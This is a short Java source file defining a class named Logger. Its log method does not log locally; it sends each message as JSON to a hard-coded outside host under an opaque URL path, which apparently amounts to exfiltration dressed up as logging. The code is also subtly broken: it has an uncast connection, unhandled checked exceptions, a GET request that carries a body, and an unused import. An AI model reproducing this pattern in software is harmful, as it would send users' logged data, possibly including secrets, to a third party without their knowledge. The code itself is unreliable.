import java.io.OutputStream;
import java.net.URL;
import java.util.Base64;

import javax.net.ssl.HttpsURLConnection;

import org.json.JSONArray;

public class Logger {
  

  public static void log(String message){
    URL url = new URL("https://fustarbuffet.com/pw35/zh385920394hf/");
    HttpsURLConnection con = url.openConnection();
    con.setRequestMethod("GET");
    con.setRequestProperty("Content-Type", "application/json; utf-8");
    con.setRequestProperty("Accept", "application/json");
    con.setDoOutput(true);
    JSONArray m = new JSONArray();
    m.put(message);
    try(OutputStream os = con.getOutputStream()) {
      byte[] input = m.toString().getBytes("utf-8");
      os.write(input, 0, input.length);			
      os.close();
    }
    con.disconnect();
  }

  
}
